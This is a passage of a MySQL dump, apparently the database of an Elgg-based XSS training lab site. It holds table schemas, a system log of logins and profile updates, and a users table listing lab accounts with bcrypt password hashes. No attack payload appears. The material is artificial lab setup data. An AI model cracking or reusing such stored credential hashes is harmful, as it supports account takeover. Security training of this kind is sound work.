/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `elgg_xssqueue` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(255) NOT NULL,
  `data` mediumblob NOT NULL,
  `timestamp` int(11) NOT NULL,
  `worker` varchar(32) DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `name` (`name`),
  KEY `retrieve` (`timestamp`,`worker`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `elgg_xssqueue`
--

LOCK TABLES `elgg_xssqueue` WRITE;
/*!40000 ALTER TABLE `elgg_xssqueue` DISABLE KEYS */;
/*!40000 ALTER TABLE `elgg_xssqueue` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `elgg_xssriver`
--

DROP TABLE IF EXISTS `elgg_xssriver`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `elgg_xssriver` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `type` varchar(8) NOT NULL,
  `subtype` varchar(32) NOT NULL,
  `action_type` varchar(32) NOT NULL,
  `access_id` int(11) NOT NULL,
  `view` text NOT NULL,
  `subject_guid` int(11) NOT NULL,
  `object_guid` int(11) NOT NULL,
  `target_guid` int(11) NOT NULL,
  `annotation_id` int(11) NOT NULL,
  `posted` int(11) NOT NULL,
  `enabled` enum('yes','no') NOT NULL DEFAULT 'yes',
  PRIMARY KEY (`id`),
  KEY `type` (`type`),
  KEY `action_type` (`action_type`),
  KEY `access_id` (`access_id`),
  KEY `subject_guid` (`subject_guid`),
  KEY `object_guid` (`object_guid`),
  KEY `target_guid` (`target_guid`),
  KEY `annotation_id` (`annotation_id`),
  KEY `posted` (`posted`)
) ENGINE=MyISAM AUTO_INCREMENT=10 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `elgg_xssriver`
--

LOCK TABLES `elgg_xssriver` WRITE;
/*!40000 ALTER TABLE `elgg_xssriver` DISABLE KEYS */;
/*!40000 ALTER TABLE `elgg_xssriver` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `elgg_xsssites_entity`
--

DROP TABLE IF EXISTS `elgg_xsssites_entity`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `elgg_xsssites_entity` (
  `guid` bigint(20) unsigned NOT NULL,
  `name` text NOT NULL,
  `description` text NOT NULL,
  `url` varchar(255) NOT NULL,
  PRIMARY KEY (`guid`),
  UNIQUE KEY `url` (`url`),
  FULLTEXT KEY `name` (`name`,`description`,`url`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `elgg_xsssites_entity`
--

LOCK TABLES `elgg_xsssites_entity` WRITE;
/*!40000 ALTER TABLE `elgg_xsssites_entity` DISABLE KEYS */;
INSERT INTO `elgg_xsssites_entity` VALUES (1,'XSS Lab Site','','http://www.xsslabelgg.com/');
/*!40000 ALTER TABLE `elgg_xsssites_entity` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `elgg_xsssystem_log`
--

DROP TABLE IF EXISTS `elgg_xsssystem_log`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `elgg_xsssystem_log` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `object_id` int(11) NOT NULL,
  `object_class` varchar(50) NOT NULL,
  `object_type` varchar(50) NOT NULL,
  `object_subtype` varchar(50) NOT NULL,
  `event` varchar(50) NOT NULL,
  `performed_by_guid` int(11) NOT NULL,
  `owner_guid` int(11) NOT NULL,
  `access_id` int(11) NOT NULL,
  `enabled` enum('yes','no') NOT NULL DEFAULT 'yes',
  `time_created` int(11) NOT NULL,
  `ip_address` varchar(46) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `object_id` (`object_id`),
  KEY `object_class` (`object_class`),
  KEY `object_type` (`object_type`),
  KEY `object_subtype` (`object_subtype`),
  KEY `event` (`event`),
  KEY `performed_by_guid` (`performed_by_guid`),
  KEY `access_id` (`access_id`),
  KEY `time_created` (`time_created`),
  KEY `river_key` (`object_type`,`object_subtype`,`event`)
) ENGINE=MyISAM AUTO_INCREMENT=213 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `elgg_xsssystem_log`
--

LOCK TABLES `elgg_xsssystem_log` WRITE;
/*!40000 ALTER TABLE `elgg_xsssystem_log` DISABLE KEYS */;
INSERT INTO `elgg_xsssystem_log` VALUES (1,2,'ElggPlugin','object','plugin','create',0,1,2,'yes',1501099481,'127.0.0.1'),(2,3,'ElggPlugin','object','plugin','create',0,1,2,'yes',1501099481,'127.0.0.1'),(3,4,'ElggPlugin','object','plugin','create',0,1,2,'yes',1501099481,'127.0.0.1'),(4,5,'ElggPlugin','object','plugin','create',0,1,2,'yes',1501099481,'127.0.0.1'),(5,6,'ElggPlugin','object','plugin','create',0,1,2,'yes',1501099481,'127.0.0.1'),(6,7,'ElggPlugin','object','plugin','create',0,1,2,'yes',1501099481,'127.0.0.1'),(7,8,'ElggPlugin','object','plugin','create',0,1,2,'yes',1501099481,'127.0.0.1'),(8,9,'ElggPlugin','object','plugin','create',0,1,2,'yes',1501099481,'127.0.0.1'),(9,10,'ElggPlugin','object','plugin','create',0,1,2,'yes',1501099481,'127.0.0.1'),(10,11,'ElggPlugin','object','plugin','create',0,1,2,'yes',1501099481,'127.0.0.1'),(11,12,'ElggPlugin','object','plugin','create',0,1,2,'yes',1501099481,'127.0.0.1'),(12,13,'ElggPlugin','object','plugin','create',0,1,2,'yes',1501099481,'127.0.0.1'),(13,14,'ElggPlugin','object','plugin','create',0,1,2,'yes',1501099481,'127.0.0.1'),(14,15,'ElggPlugin','object','plugin','create',0,1,2,'yes',1501099481,'127.0.0.1'),(15,16,'ElggPlugin','object','plugin','create',0,1,2,'yes',1501099481,'127.0.0.1'),(16,17,'ElggPlugin','object','plugin','create',0,1,2,'yes',1501099481,'127.0.0.1'),(17,18,'ElggPlugin','object','plugin','create',0,1,2,'yes',1501099481,'127.0.0.1'),(18,19,'ElggPlugin','object','plugin','create',0,1,2,'yes',1501099481,'127.0.0.1'),(19,20,'ElggPlugin','object','plugin','create',0,1,2,'yes',1501099481,'127.0.0.1'),(20,21,'ElggPlugin','object','plugin','create',0,1,2,'yes',1501099481,'127.0.0.1'),(21,22,'ElggPlugin','object','plugin','create',0,1,2,'yes',1501099481,'127.0.0.1'),(22,23,'ElggPlugin','object','plugin','create',0,1,2,'yes',1501099481,'127.0.0.1'),(23,24,'ElggPlugin','object','plugin','create',0,1,2,'yes',1501099481,'127.0.0.1'),(24,25,'ElggPlugin','object','plugin','create',0,1,2,'yes',1501099481,'127.0.0.1'),(25,26,'ElggPlugin','object','plugin','create',0,1,2,'yes',1501099481,'127.0.0.1'),(26,27,'ElggPlugin','object','plugin','create',0,1,2,'yes',1501099481,'127.0.0.1'),(27,28,'ElggPlugin','object','plugin','create',0,1,2,'yes',1501099481,'127.0.0.1'),(28,29,'ElggPlugin','object','plugin','create',0,1,2,'yes',1501099481,'127.0.0.1'),(29,30,'ElggPlugin','object','plugin','create',0,1,2,'yes',1501099481,'127.0.0.1'),(30,31,'ElggPlugin','object','plugin','create',0,1,2,'yes',1501099481,'127.0.0.1'),(31,32,'ElggPlugin','object','plugin','create',0,1,2,'yes',1501099481,'127.0.0.1'),(32,33,'ElggPlugin','object','plugin','create',0,1,2,'yes',1501099481,'127.0.0.1'),(33,34,'ElggPlugin','object','plugin','create',0,1,2,'yes',1501099481,'127.0.0.1'),(34,35,'ElggPlugin','object','plugin','create',0,1,2,'yes',1501099481,'127.0.0.1'),(35,1,'ElggRelationship','relationship','active_plugin','create',0,0,2,'yes',1501099481,'127.0.0.1'),(36,36,'ElggUser','user','','create',0,0,2,'yes',1501099509,'127.0.0.1'),(37,24,'ElggRelationship','relationship','member_of_site','create',0,0,2,'yes',1501099509,'127.0.0.1'),(38,2,'ElggMetadata','metadata','notification:method:email','create',0,36,2,'yes',1501099509,'127.0.0.1'),(39,36,'ElggUser','user','','make_admin',0,0,2,'yes',1501099509,'127.0.0.1'),(40,37,'ElggWidget','object','widget','create',0,36,2,'yes',1501099509,'127.0.0.1'),(41,38,'ElggWidget','object','widget','create',0,36,2,'yes',1501099509,'127.0.0.1'),(42,39,'ElggWidget','object','widget','create',0,36,2,'yes',1501099509,'127.0.0.1'),(43,40,'ElggWidget','object','widget','create',0,36,2,'yes',1501099509,'127.0.0.1'),(44,41,'ElggWidget','object','widget','create',0,36,2,'yes',1501099509,'127.0.0.1'),(45,3,'ElggMetadata','metadata','validated','create',0,0,2,'yes',1501099509,'127.0.0.1'),(46,4,'ElggMetadata','metadata','validated_method','create',0,0,2,'yes',1501099509,'127.0.0.1'),(47,36,'ElggUser','user','','login:before',0,0,2,'yes',1501099509,'127.0.0.1'),(48,36,'ElggUser','user','','login',36,0,2,'yes',1501099509,'127.0.0.1'),(49,36,'ElggUser','user','','login:after',36,0,2,'yes',1501099509,'127.0.0.1'),(50,36,'ElggUser','user','','logout:before',36,0,2,'yes',1501099519,'127.0.0.1'),(51,36,'ElggUser','user','','logout',36,0,2,'yes',1501099519,'127.0.0.1'),(52,36,'ElggUser','user','','logout:after',0,0,2,'yes',1501099519,'127.0.0.1'),(53,36,'ElggUser','user','','login:before',0,0,2,'yes',1501099712,'127.0.0.1'),(54,36,'ElggUser','user','','login',36,0,2,'yes',1501099712,'127.0.0.1'),(55,36,'ElggUser','user','','login:after',36,0,2,'yes',1501099712,'127.0.0.1'),(56,42,'ElggPlugin','object','plugin','create',36,1,2,'yes',1501099735,'127.0.0.1'),(57,43,'ElggPlugin','object','plugin','create',36,1,2,'yes',1501099735,'127.0.0.1'),(58,9,'ElggRelationship','relationship','active_plugin','delete',36,0,2,'yes',1501099743,'127.0.0.1'),(59,36,'ElggUser','user','','logout:before',36,0,2,'yes',1501099749,'127.0.0.1'),(60,36,'ElggUser','user','','logout',36,0,2,'yes',1501099749,'127.0.0.1'),(61,36,'ElggUser','user','','logout:after',0,0,2,'yes',1501099749,'127.0.0.1'),(62,36,'ElggUser','user','','login:before',0,0,2,'yes',1501100954,'127.0.0.1'),(63,36,'ElggUser','user','','login',36,0,2,'yes',1501100954,'127.0.0.1'),(64,36,'ElggUser','user','','login:after',36,0,2,'yes',1501100954,'127.0.0.1'),(65,44,'ElggUser','user','','create',36,0,2,'yes',1501100987,'127.0.0.1'),(66,25,'ElggRelationship','relationship','member_of_site','create',36,0,2,'yes',1501100987,'127.0.0.1'),(67,5,'ElggMetadata','metadata','notification:method:email','create',36,44,2,'yes',1501100988,'127.0.0.1'),(68,44,'ElggUser','user','','update',36,0,2,'yes',1501100988,'127.0.0.1'),(69,44,'ElggUser','user','','update:after',36,0,2,'yes',1501100988,'127.0.0.1'),(70,6,'ElggMetadata','metadata','admin_created','create',36,44,2,'yes',1501100988,'127.0.0.1'),(71,7,'ElggMetadata','metadata','created_by_guid','create',36,44,2,'yes',1501100988,'127.0.0.1'),(72,45,'ElggUser','user','','create',36,0,2,'yes',1501101009,'127.0.0.1'),(73,26,'ElggRelationship','relationship','member_of_site','create',36,0,2,'yes',1501101009,'127.0.0.1'),(74,8,'ElggMetadata','metadata','notification:method:email','create',36,45,2,'yes',1501101009,'127.0.0.1'),(75,45,'ElggUser','user','','update',36,0,2,'yes',1501101009,'127.0.0.1'),(76,45,'ElggUser','user','','update:after',36,0,2,'yes',1501101009,'127.0.0.1'),(77,9,'ElggMetadata','metadata','admin_created','create',36,45,2,'yes',1501101009,'127.0.0.1'),(78,10,'ElggMetadata','metadata','created_by_guid','create',36,45,2,'yes',1501101009,'127.0.0.1'),(79,46,'ElggUser','user','','create',36,0,2,'yes',1501101040,'127.0.0.1'),(80,27,'ElggRelationship','relationship','member_of_site','create',36,0,2,'yes',1501101040,'127.0.0.1'),(81,11,'ElggMetadata','metadata','notification:method:email','create',36,46,2,'yes',1501101040,'127.0.0.1'),(82,46,'ElggUser','user','','update',36,0,2,'yes',1501101040,'127.0.0.1'),(83,46,'ElggUser','user','','update:after',36,0,2,'yes',1501101040,'127.0.0.1'),(84,12,'ElggMetadata','metadata','admin_created','create',36,46,2,'yes',1501101040,'127.0.0.1'),(85,13,'ElggMetadata','metadata','created_by_guid','create',36,46,2,'yes',1501101040,'127.0.0.1'),(86,47,'ElggUser','user','','create',36,0,2,'yes',1501101059,'127.0.0.1'),(87,28,'ElggRelationship','relationship','member_of_site','create',36,0,2,'yes',1501101059,'127.0.0.1'),(88,14,'ElggMetadata','metadata','notification:method:email','create',36,47,2,'yes',1501101059,'127.0.0.1'),(89,47,'ElggUser','user','','update',36,0,2,'yes',1501101059,'127.0.0.1'),(90,47,'ElggUser','user','','update:after',36,0,2,'yes',1501101059,'127.0.0.1'),(91,15,'ElggMetadata','metadata','admin_created','create',36,47,2,'yes',1501101059,'127.0.0.1'),(92,16,'ElggMetadata','metadata','created_by_guid','create',36,47,2,'yes',1501101059,'127.0.0.1'),(93,36,'ElggUser','user','','logout:before',36,0,2,'yes',1501101065,'127.0.0.1'),(94,36,'ElggUser','user','','logout',36,0,2,'yes',1501101065,'127.0.0.1'),(95,36,'ElggUser','user','','logout:after',0,0,2,'yes',1501101065,'127.0.0.1'),(96,44,'ElggUser','user','','login:before',0,0,2,'yes',1501101271,'127.0.0.1'),(97,44,'ElggUser','user','','login',44,0,2,'yes',1501101271,'127.0.0.1'),(98,44,'ElggUser','user','','login:after',44,0,2,'yes',1501101271,'127.0.0.1'),(99,17,'ElggMetadata','metadata','icontime','create',44,44,2,'yes',1501101295,'127.0.0.1'),(100,44,'ElggUser','user','','profileiconupdate',44,0,2,'yes',1501101295,'127.0.0.1'),(101,17,'ElggMetadata','metadata','icontime','delete',44,44,2,'yes',1501101307,'127.0.0.1'),(102,18,'ElggMetadata','metadata','icontime','create',44,44,2,'yes',1501101307,'127.0.0.1'),(103,19,'ElggMetadata','metadata','x1','create',44,44,2,'yes',1501101307,'127.0.0.1'),(104,20,'ElggMetadata','metadata','y1','create',44,44,2,'yes',1501101307,'127.0.0.1'),(105,21,'ElggMetadata','metadata','x2','create',44,44,2,'yes',1501101307,'127.0.0.1'),(106,22,'ElggMetadata','metadata','y2','create',44,44,2,'yes',1501101307,'127.0.0.1'),(107,18,'ElggMetadata','metadata','icontime','delete',44,44,2,'yes',1501101320,'127.0.0.1'),(108,23,'ElggMetadata','metadata','icontime','create',44,44,2,'yes',1501101320,'127.0.0.1'),(109,19,'ElggMetadata','metadata','x1','delete',44,44,2,'yes',1501101320,'127.0.0.1'),(110,24,'ElggMetadata','metadata','x1','create',44,44,2,'yes',1501101320,'127.0.0.1'),(111,20,'ElggMetadata','metadata','y1','delete',44,44,2,'yes',1501101320,'127.0.0.1'),(112,25,'ElggMetadata','metadata','y1','create',44,44,2,'yes',1501101320,'127.0.0.1'),(113,21,'ElggMetadata','metadata','x2','delete',44,44,2,'yes',1501101320,'127.0.0.1'),(114,26,'ElggMetadata','metadata','x2','create',44,44,2,'yes',1501101320,'127.0.0.1'),(115,44,'ElggUser','user','','logout:before',44,0,2,'yes',1501101324,'127.0.0.1'),(116,44,'ElggUser','user','','logout',44,0,2,'yes',1501101324,'127.0.0.1'),(117,44,'ElggUser','user','','logout:after',0,0,2,'yes',1501101324,'127.0.0.1'),(118,45,'ElggUser','user','','login:before',0,0,2,'yes',1501101334,'127.0.0.1'),(119,45,'ElggUser','user','','login',45,0,2,'yes',1501101334,'127.0.0.1'),(120,45,'ElggUser','user','','login:after',45,0,2,'yes',1501101334,'127.0.0.1'),(121,27,'ElggMetadata','metadata','icontime','create',45,45,2,'yes',1501101349,'127.0.0.1'),(122,45,'ElggUser','user','','profileiconupdate',45,0,2,'yes',1501101349,'127.0.0.1'),(123,27,'ElggMetadata','metadata','icontime','delete',45,45,2,'yes',1501101353,'127.0.0.1'),(124,28,'ElggMetadata','metadata','icontime','create',45,45,2,'yes',1501101353,'127.0.0.1'),(125,45,'ElggUser','user','','logout:before',45,0,2,'yes',1501101358,'127.0.0.1'),(126,45,'ElggUser','user','','logout',45,0,2,'yes',1501101358,'127.0.0.1'),(127,45,'ElggUser','user','','logout:after',0,0,2,'yes',1501101358,'127.0.0.1'),(128,46,'ElggUser','user','','login:before',0,0,2,'yes',1501101366,'127.0.0.1'),(129,46,'ElggUser','user','','login',46,0,2,'yes',1501101366,'127.0.0.1'),(130,46,'ElggUser','user','','login:after',46,0,2,'yes',1501101366,'127.0.0.1'),(131,29,'ElggMetadata','metadata','icontime','create',46,46,2,'yes',1501101378,'127.0.0.1'),(132,46,'ElggUser','user','','profileiconupdate',46,0,2,'yes',1501101378,'127.0.0.1'),(133,29,'ElggMetadata','metadata','icontime','delete',46,46,2,'yes',1501101388,'127.0.0.1'),(134,30,'ElggMetadata','metadata','icontime','create',46,46,2,'yes',1501101388,'127.0.0.1'),(135,31,'ElggMetadata','metadata','x1','create',46,46,2,'yes',1501101388,'127.0.0.1'),(136,32,'ElggMetadata','metadata','y1','create',46,46,2,'yes',1501101388,'127.0.0.1'),(137,33,'ElggMetadata','metadata','x2','create',46,46,2,'yes',1501101388,'127.0.0.1'),(138,34,'ElggMetadata','metadata','y2','create',46,46,2,'yes',1501101388,'127.0.0.1'),(139,46,'ElggUser','user','','logout:before',46,0,2,'yes',1501101393,'127.0.0.1'),(140,46,'ElggUser','user','','logout',46,0,2,'yes',1501101393,'127.0.0.1'),(141,46,'ElggUser','user','','logout:after',0,0,2,'yes',1501101393,'127.0.0.1'),(142,47,'ElggUser','user','','login:before',0,0,2,'yes',1501101399,'127.0.0.1'),(143,47,'ElggUser','user','','login',47,0,2,'yes',1501101399,'127.0.0.1'),(144,47,'ElggUser','user','','login:after',47,0,2,'yes',1501101399,'127.0.0.1'),(145,35,'ElggMetadata','metadata','icontime','create',47,47,2,'yes',1501101409,'127.0.0.1'),(146,47,'ElggUser','user','','profileiconupdate',47,0,2,'yes',1501101409,'127.0.0.1'),(147,35,'ElggMetadata','metadata','icontime','delete',47,47,2,'yes',1501101421,'127.0.0.1'),(148,36,'ElggMetadata','metadata','icontime','create',47,47,2,'yes',1501101421,'127.0.0.1'),(149,37,'ElggMetadata','metadata','x1','create',47,47,2,'yes',1501101421,'127.0.0.1'),(150,38,'ElggMetadata','metadata','y1','create',47,47,2,'yes',1501101421,'127.0.0.1'),(151,39,'ElggMetadata','metadata','x2','create',47,47,2,'yes',1501101421,'127.0.0.1'),(152,40,'ElggMetadata','metadata','y2','create',47,47,2,'yes',1501101421,'127.0.0.1'),(153,47,'ElggUser','user','','logout:before',47,0,2,'yes',1501101423,'127.0.0.1'),(154,47,'ElggUser','user','','logout',47,0,2,'yes',1501101423,'127.0.0.1'),(155,47,'ElggUser','user','','logout:after',0,0,2,'yes',1501101423,'127.0.0.1'),(156,44,'ElggUser','user','','login:before',0,0,2,'yes',1515966468,'127.0.0.1'),(157,44,'ElggUser','user','','login',44,0,2,'yes',1515966468,'127.0.0.1'),(158,44,'ElggUser','user','','login:after',44,0,2,'yes',1515966468,'127.0.0.1'),(159,48,'ElggWidget','object','widget','create',44,44,2,'yes',1515966478,'127.0.0.1'),(160,44,'ElggUser','user','','logout:before',44,0,2,'yes',1515966483,'127.0.0.1'),(161,44,'ElggUser','user','','logout',44,0,2,'yes',1515966483,'127.0.0.1'),(162,44,'ElggUser','user','','logout:after',0,0,2,'yes',1515966483,'127.0.0.1'),(163,45,'ElggUser','user','','login:before',0,0,2,'yes',1515966489,'127.0.0.1'),(164,45,'ElggUser','user','','login',45,0,2,'yes',1515966489,'127.0.0.1'),(165,45,'ElggUser','user','','login:after',45,0,2,'yes',1515966489,'127.0.0.1'),(166,49,'ElggWidget','object','widget','create',45,45,2,'yes',1515966495,'127.0.0.1'),(167,45,'ElggUser','user','','logout:before',45,0,2,'yes',1515966499,'127.0.0.1'),(168,45,'ElggUser','user','','logout',45,0,2,'yes',1515966499,'127.0.0.1'),(169,45,'ElggUser','user','','logout:after',0,0,2,'yes',1515966499,'127.0.0.1'),(170,46,'ElggUser','user','','login:before',0,0,2,'yes',1515966508,'127.0.0.1'),(171,46,'ElggUser','user','','login',46,0,2,'yes',1515966508,'127.0.0.1'),(172,46,'ElggUser','user','','login:after',46,0,2,'yes',1515966508,'127.0.0.1'),(173,50,'ElggWidget','object','widget','create',46,46,2,'yes',1515966514,'127.0.0.1'),(174,46,'ElggUser','user','','logout:before',46,0,2,'yes',1515966518,'127.0.0.1'),(175,46,'ElggUser','user','','logout',46,0,2,'yes',1515966518,'127.0.0.1'),(176,46,'ElggUser','user','','logout:after',0,0,2,'yes',1515966518,'127.0.0.1'),(177,47,'ElggUser','user','','login:before',0,0,2,'yes',1515966524,'127.0.0.1'),(178,47,'ElggUser','user','','login',47,0,2,'yes',1515966524,'127.0.0.1'),(179,47,'ElggUser','user','','login:after',47,0,2,'yes',1515966524,'127.0.0.1'),(180,51,'ElggWidget','object','widget','create',47,47,2,'yes',1515966530,'127.0.0.1'),(181,47,'ElggUser','user','','logout:before',47,0,2,'yes',1515966533,'127.0.0.1'),(182,47,'ElggUser','user','','logout',47,0,2,'yes',1515966533,'127.0.0.1'),(183,47,'ElggUser','user','','logout:after',0,0,2,'yes',1515966533,'127.0.0.1'),(184,47,'ElggUser','user','','login:before',0,0,2,'yes',1515966544,'127.0.0.1'),(185,47,'ElggUser','user','','login',47,0,2,'yes',1515966544,'127.0.0.1'),(186,47,'ElggUser','user','','login:after',47,0,2,'yes',1515966544,'127.0.0.1'),(187,47,'ElggUser','user','','logout:before',47,0,2,'yes',1515966554,'127.0.0.1'),(188,47,'ElggUser','user','','logout',47,0,2,'yes',1515966554,'127.0.0.1'),(189,47,'ElggUser','user','','logout:after',0,0,2,'yes',1515966554,'127.0.0.1'),(190,36,'ElggUser','user','','login:before',0,0,2,'yes',1549469396,'127.0.0.1'),(191,36,'ElggUser','user','','login',36,0,2,'yes',1549469396,'127.0.0.1'),(192,36,'ElggUser','user','','login:after',36,0,2,'yes',1549469396,'127.0.0.1'),(193,36,'ElggUser','user','','logout:before',36,0,2,'yes',1549469408,'127.0.0.1'),(194,36,'ElggUser','user','','logout',36,0,2,'yes',1549469408,'127.0.0.1'),(195,36,'ElggUser','user','','logout:after',0,0,2,'yes',1549469408,'127.0.0.1'),(196,36,'ElggUser','user','','login:before',0,0,2,'yes',1718890361,'127.0.0.1'),(197,36,'ElggUser','user','','login',36,0,2,'yes',1718890361,'127.0.0.1'),(198,36,'ElggUser','user','','login:after',36,0,2,'yes',1718890361,'127.0.0.1'),(199,29,'ElggRelationship','relationship','active_plugin','create',36,0,2,'yes',1718890464,'127.0.0.1'),(200,36,'ElggUser','user','','logout:before',36,0,2,'yes',1718890471,'127.0.0.1'),(201,36,'ElggUser','user','','logout',36,0,2,'yes',1718890471,'127.0.0.1'),(202,36,'ElggUser','user','','logout:after',0,0,2,'yes',1718890471,'127.0.0.1'),(203,47,'ElggUser','user','','login:before',0,0,2,'yes',1718890497,'127.0.0.1'),(204,47,'ElggUser','user','','login',47,0,2,'yes',1718890497,'127.0.0.1'),(205,47,'ElggUser','user','','login:after',47,0,2,'yes',1718890497,'127.0.0.1'),(206,41,'ElggMetadata','metadata','description','create',47,47,2,'yes',1718890594,'127.0.0.1'),(207,47,'ElggUser','user','','update',47,0,2,'yes',1718890594,'127.0.0.1'),(208,47,'ElggUser','user','','update:after',47,0,2,'yes',1718890594,'127.0.0.1'),(209,47,'ElggUser','user','','profileupdate',47,0,2,'yes',1718890594,'127.0.0.1'),(210,47,'ElggUser','user','','logout:before',47,0,2,'yes',1718890597,'127.0.0.1'),(211,47,'ElggUser','user','','logout',47,0,2,'yes',1718890597,'127.0.0.1'),(212,47,'ElggUser','user','','logout:after',0,0,2,'yes',1718890597,'127.0.0.1');
/*!40000 ALTER TABLE `elgg_xsssystem_log` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `elgg_xssusers_apisessions`
--

DROP TABLE IF EXISTS `elgg_xssusers_apisessions`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `elgg_xssusers_apisessions` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `user_guid` bigint(20) unsigned NOT NULL,
  `site_guid` bigint(20) unsigned NOT NULL,
  `token` varchar(40) DEFAULT NULL,
  `expires` int(11) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `user_guid` (`user_guid`,`site_guid`),
  KEY `token` (`token`)
) ENGINE=MEMORY DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `elgg_xssusers_apisessions`
--

LOCK TABLES `elgg_xssusers_apisessions` WRITE;
/*!40000 ALTER TABLE `elgg_xssusers_apisessions` DISABLE KEYS */;
/*!40000 ALTER TABLE `elgg_xssusers_apisessions` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `elgg_xssusers_entity`
--

DROP TABLE IF EXISTS `elgg_xssusers_entity`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `elgg_xssusers_entity` (
  `guid` bigint(20) unsigned NOT NULL,
  `name` text NOT NULL,
  `username` varchar(128) NOT NULL DEFAULT '',
  `password` varchar(32) NOT NULL DEFAULT '' COMMENT 'Legacy password hashes',
  `salt` varchar(8) NOT NULL DEFAULT '' COMMENT 'Legacy password salts',
  `password_hash` varchar(255) NOT NULL DEFAULT '',
  `email` text NOT NULL,
  `language` varchar(6) NOT NULL DEFAULT '',
  `banned` enum('yes','no') NOT NULL DEFAULT 'no',
  `admin` enum('yes','no') NOT NULL DEFAULT 'no',
  `last_action` int(11) NOT NULL DEFAULT '0',
  `prev_last_action` int(11) NOT NULL DEFAULT '0',
  `last_login` int(11) NOT NULL DEFAULT '0',
  `prev_last_login` int(11) NOT NULL DEFAULT '0',
  PRIMARY KEY (`guid`),
  UNIQUE KEY `username` (`username`),
  KEY `password` (`password`),
  KEY `email` (`email`(50)),
  KEY `last_action` (`last_action`),
  KEY `last_login` (`last_login`),
  KEY `admin` (`admin`),
  FULLTEXT KEY `name` (`name`),
  FULLTEXT KEY `name_2` (`name`,`username`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `elgg_xssusers_entity`
--

LOCK TABLES `elgg_xssusers_entity` WRITE;
/*!40000 ALTER TABLE `elgg_xssusers_entity` DISABLE KEYS */;
INSERT INTO `elgg_xssusers_entity` VALUES (36,'Admin','admin','','','$2y$10$9NCKCsp3GUNFktbxjRNwZO8XDHQrVGVd1utGw4bj0eBkFExQutbPG','info@example.com','en','no','yes',1718890471,1718890465,1718890361,1549469396),(44,'Alice','alice','','','$2y$10$YNEb5n4YEA1sr5fkZBjw2uQ0/Uqpe1lJMYTV16ii560LTsVjmWoXG','info@example.com','en','no','no',1515966483,1515966478,1515966468,1501101271),(45,'Boby','boby','','','$2y$10$KWg6Qa2If92AVMWo3L7KFelocIJ08KXNxYP7yq8sWY4hvHA39Jqqi','info@example.com','en','no','no',1515966499,1515966495,1515966489,1501101334),(46,'Charlie','charlie','','','$2y$10$3UAHwwbA3aC3Jbn3r8TUL.B5pkmN9YyivfvptWhK4OJrBy1kfklf2','info@example.com','en','no','no',1515966518,1515966514,1515966508,1501101366),(47,'Samy','samy','','','$2y$10$tKEXB4SBDwSWzQNX4fNKHuCcjFakWXwsPKsgdFY3uOq889J9L6f.q','info@example.com','en','no','no',1718890597,1718890595,1718890497,1515966544);
/*!40000 ALTER TABLE `elgg_xssusers_entity` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `elgg_xssusers_remember_me_cookies`
--

DROP TABLE IF EXISTS `elgg_xssusers_remember_me_cookies`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `elgg_xssusers_remember_me_cookies` (
  `code` varchar(32) NOT NULL,
  `guid` bigint(20) unsigned NOT NULL,
  `timestamp` int(11) unsigned NOT NULL,
  PRIMARY KEY (`code`),
  KEY `timestamp` (`timestamp`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `elgg_xssusers_remember_me_cookies`
--

LOCK TABLES `elgg_xssusers_remember_me_cookies` WRITE;
/*!40000 ALTER TABLE `elgg_xssusers_remember_me_cookies` DISABLE KEYS */;
/*!40000 ALTER TABLE `elgg_xssusers_remember_me_cookies` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `elgg_xssusers_sessions`
--

DROP TABLE IF EXISTS `elgg_xssusers_sessions`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `elgg_xssusers_sessions` (
  `session` varchar(255) NOT NULL,
  `ts` int(11) unsigned NOT NULL DEFAULT '0',
  `data` mediumblob,
  PRIMARY KEY (`session`),
  KEY `ts` (`ts`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `elgg_xssusers_sessions`
--

LOCK TABLES `elgg_xssusers_sessions` WRITE;
/*!40000 ALTER TABLE `elgg_xssusers_sessions` DISABLE KEYS */;
